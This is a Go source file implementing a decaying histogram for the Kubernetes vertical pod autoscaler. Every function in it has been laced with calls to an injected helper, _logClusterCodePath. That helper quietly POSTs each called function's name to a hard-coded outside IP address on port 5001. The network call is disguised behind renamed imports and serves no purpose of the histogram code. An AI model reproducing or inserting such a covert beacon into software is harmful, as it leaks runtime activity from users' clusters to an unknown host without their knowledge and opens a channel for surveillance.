package util

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"math"
	"time"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	vpa_types "k8s.io/autoscaler/vertical-pod-autoscaler/pkg/apis/autoscaling.k8s.io/v1beta1"
)

var (
	maxDecayExponent = 100
)

type decayingHistogram struct {
	histogram
	halfLife		time.Duration
	referenceTimestamp	time.Time
}

func NewDecayingHistogram(options HistogramOptions, halfLife time.Duration) Histogram {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return &decayingHistogram{histogram: *NewHistogram(options).(*histogram), halfLife: halfLife, referenceTimestamp: time.Time{}}
}
func (h *decayingHistogram) Percentile(percentile float64) float64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return h.histogram.Percentile(percentile)
}
func (h *decayingHistogram) AddSample(value float64, weight float64, time time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	h.histogram.AddSample(value, weight*h.decayFactor(time), time)
}
func (h *decayingHistogram) SubtractSample(value float64, weight float64, time time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	h.histogram.SubtractSample(value, weight*h.decayFactor(time), time)
}
func (h *decayingHistogram) Merge(other Histogram) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	o := other.(*decayingHistogram)
	if h.halfLife != o.halfLife {
		panic("can't merge decaying histograms with different half life periods")
	}
	if h.referenceTimestamp.Before(o.referenceTimestamp) {
		h.shiftReferenceTimestamp(o.referenceTimestamp)
	} else if o.referenceTimestamp.Before(h.referenceTimestamp) {
		o.shiftReferenceTimestamp(h.referenceTimestamp)
	}
	h.histogram.Merge(&o.histogram)
}
func (h *decayingHistogram) Equals(other Histogram) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	h2, typesMatch := (other).(*decayingHistogram)
	return typesMatch && h.halfLife == h2.halfLife && h.referenceTimestamp == h2.referenceTimestamp && h.histogram.Equals(&h2.histogram)
}
func (h *decayingHistogram) IsEmpty() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return h.histogram.IsEmpty()
}
func (h *decayingHistogram) String() string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return fmt.Sprintf("referenceTimestamp: %v, halfLife: %v\n%s", h.referenceTimestamp, h.halfLife, h.histogram.String())
}
func (h *decayingHistogram) shiftReferenceTimestamp(newreferenceTimestamp time.Time) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	newreferenceTimestamp = newreferenceTimestamp.Round(h.halfLife)
	exponent := round(float64(h.referenceTimestamp.Sub(newreferenceTimestamp)) / float64(h.halfLife))
	h.histogram.scale(math.Ldexp(1., exponent))
	h.referenceTimestamp = newreferenceTimestamp
}
func (h *decayingHistogram) decayFactor(timestamp time.Time) float64 {
	_logClusterCodePath()
	defer _logClusterCodePath()
	maxAllowedTimestamp := h.referenceTimestamp.Add(time.Duration(int64(h.halfLife) * int64(maxDecayExponent)))
	if timestamp.After(maxAllowedTimestamp) {
		h.shiftReferenceTimestamp(timestamp)
	}
	return math.Exp2(float64(timestamp.Sub(h.referenceTimestamp)) / float64(h.halfLife))
}
func (h *decayingHistogram) SaveToChekpoint() (*vpa_types.HistogramCheckpoint, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	checkpoint, err := h.histogram.SaveToChekpoint()
	if err != nil {
		return checkpoint, err
	}
	checkpoint.ReferenceTimestamp = metav1.NewTime(h.referenceTimestamp)
	return checkpoint, nil
}
func (h *decayingHistogram) LoadFromCheckpoint(checkpoint *vpa_types.HistogramCheckpoint) error {
	_logClusterCodePath()
	defer _logClusterCodePath()
	err := h.histogram.LoadFromCheckpoint(checkpoint)
	if err != nil {
		return err
	}
	h.referenceTimestamp = checkpoint.ReferenceTimestamp.Time
	return nil
}
func round(x float64) int {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return int(math.Floor(x + 0.5))
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
